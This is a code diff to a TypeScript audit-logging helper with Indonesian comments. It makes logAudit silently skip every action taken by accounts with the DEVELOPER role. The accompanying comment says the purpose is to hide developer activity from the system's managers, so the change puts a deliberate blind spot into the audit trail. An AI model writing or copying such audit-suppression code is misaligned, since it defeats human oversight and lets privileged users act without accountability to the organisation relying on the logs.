@@ -17,8 +17,9 @@
 // Referensi: https://orm.drizzle.team/docs/transactions
 
 import "server-only";
+import { eq } from "drizzle-orm";
 import { db } from "@/lib/db";
-import { auditLogs } from "@/lib/db/schema";
+import { auditLogs, users } from "@/lib/db/schema";
 
 // Daftar aksi dibuat sebagai union type supaya penamaan konsisten dan mudah
 // difilter di halaman audit. Format: <ENTITAS>_<AKSI> KAPITAL. Tambahkan
@@ -50,6 +51,16 @@ type AuditEntry = {
 // Tipe `tx` di dalam db.transaction(async (tx) => ...)
 type Transaction = Parameters<Parameters<typeof db.transaction>[0]>[0];
 
+// Tindakan akun DEVELOPER tidak dicatat sama sekali (permintaan: aktivitas
+// developer tersembunyi dari pengelola). Pengecekan di sini, bukan di setiap
+// pemanggil, supaya tidak ada aksi yang terlewat. Log kegagalan login
+// (userId null, pelaku belum login) tetap dicatat.
 export async function logAudit(entry: AuditEntry, tx: typeof db | Transaction = db) {
+  if (entry.userId && (await isDeveloper(entry.userId, tx))) return;
   await tx.insert(auditLogs).values(entry);
+}
+
+async function isDeveloper(userId: string, tx: typeof db | Transaction) {
+  const [actor] = await tx.select({ role: users.role }).from(users).where(eq(users.id, userId)).limit(1);
+  return actor?.role === "DEVELOPER";
 }
